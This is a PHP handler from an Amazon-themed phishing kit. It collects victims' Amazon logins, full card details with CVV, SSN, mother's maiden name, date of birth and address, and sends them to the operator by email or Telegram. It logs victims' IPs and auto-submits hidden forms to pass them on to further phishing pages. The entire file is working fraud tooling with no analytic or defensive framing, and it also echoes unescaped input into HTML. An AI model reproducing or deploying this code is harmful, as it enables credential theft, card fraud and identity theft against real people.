<?php
session_start();
include '../main.php';

$ip = getUserIP();
$randomnumber = rand(1, 100);
if(!isset($_POST['email'])) {
exit(header("HTTP/1.0 404 Not Found")); 
}else{
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
$asdasdas = $_POST['cc'];
$tolkon = str_replace(" ", "", $asdasdas);
$bin = check_bin($tolkon);
$bins = preg_replace('/\s/', '', $tolkon);
$bins = substr($bins,0,6);
if($bin["brand"] == "") {
        $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
    $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
$expnya = $_POST['exp'];
$expired = str_replace("/", "|", $expnya);
$forcheck = "".$tolkon."|".$expired."|".$_POST['cvv']."";
$fromsend = "FROM: ".$_POST['cname']." <".$sender_mail.">";
$message = '
===============[ AMAZON LOGIN ]===============<br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['pass_log'].'<br>
===============[ CARD INFORMATION ]===============<br>
Bank : '.$bin["bank"]["name"].'<br>
Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'<br>
Level : '.strtoupper($bin["brand"]).'<br>
Card Holder : '.$_POST['cname'].'<br>
Card Number : '.$tolkon.'<br>
Expired (MM/YY) : '.$_POST['exp'].'<br>
CVV : '.$_POST['cvv'].'<br>
Amex CID : '.$cid.'<br>
MMN : '.$_POST['mmn'].'<br>
For Check : '.$forcheck.'<br>
===============[ BILLING INFORMATION ]===============<br>
Full Name : '.$_POST['fname'].'<br>
State : '.$_POST['state'].'<br>
City : '.$_POST['city'].'<br>
Address : '.$_POST['address'].'<br>
ZIP Code : '.$_POST['zip'].'<br>
Date Of Birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
Phone Number : '.$_POST['phone'].'<br>
===============[ DEVICE INFORMATION ]===============<br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Useragent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / Browser : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Date : '.$date.'<br>
===============[ SPM55 - AMAZON ]===============
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$fromsend.'' . "\r\n";
api($message,$subject,"email");
if ($send_login == "email") {
mail($email_result, $subject, $message, $headers);
tulis_file("../result/cc.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
}else{
        $message = 'message========[ LOGIN INFORMATION ]=======|Email : '.$_POST['email'].'|Password : '.$_POST['pass_log'].'|=======[ CARD INFORMATION 2 ]=======|Bank : '.$bin["bank"]["name"].'|Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'|Level : '.strtoupper($bin["brand"]).'|Card Holder : '.$_POST['cname'].'|Card Number : '.$tolkon.'|Expired Date : '.$_POST['exp'].'|CVV/CVC : '.$_POST['cvv'].'|Amex CID : '.$cid.'|MMN : '.$_POST['mmn'].'|=======[ BILLING INFORMATION ]=======|Full Name : '.$_POST['fname'].'|State : '.$_POST['state'].'|City : '.$_POST['city'].'|Address : '.$_POST['address'].'|Zip Code : '.$_POST['zip'].'|DOB : '.$_POST['dob'].'|SSN : '.$_POST['ssn'].'|Phone : '.$_POST['phone'].'|=======[ DEVICE INFORMATION ]=======|Country : '.$cn.'|Region : '.$regioncity.'|City : '.$city.'|User Agent : '.$user_agent.'|OS / BR : '.$os.' / '.$br.'|ISP : '.$ispuser.'|IP : '.$ip.'|Timezone : '.$timezone.'|=======[ SPM55 - AMAZON ]=======';
        send_telegram($set_ip,$domain,$message);
        tulis_file("../result/cc.txt", $ip);
        tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
}
if ($get_pap == "on") {
echo "<form id='boyxd' method='POST' action='../document-verification'>
<input type='hidden' name='email' value='".$_POST['email']."'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
<input type='hidden' name='state' value='".$_POST['state']."'>
<input type='hidden' name='city' value='".$_POST['city']."'>
<input type='hidden' name='address' value='".$_POST['address']."'>
<input type='hidden' name='zip' value='".$_POST['zip']."'>
<input type='hidden' name='dob' value='".$_POST['dob']."'>
<input type='hidden' name='phone' value='".$_POST['phone']."'>
<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
if ($get_bank == "on") {
echo "<form id='boyxd' method='POST' action='../bank'>
<input type='hidden' name='email' value='".$_POST['email']."'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
<input type='hidden' name='state' value='".$_POST['state']."'>
<input type='hidden' name='city' value='".$_POST['city']."'>
<input type='hidden' name='address' value='".$_POST['address']."'>
<input type='hidden' name='zip' value='".$_POST['zip']."'>
<input type='hidden' name='dob' value='".$_POST['dob']."'>
<input type='hidden' name='phone' value='".$_POST['phone']."'>
<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "<form id='boyxd' method='POST' action='../done'>
<input type='hidden' name='email' value='".$_POST['email']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
}
?>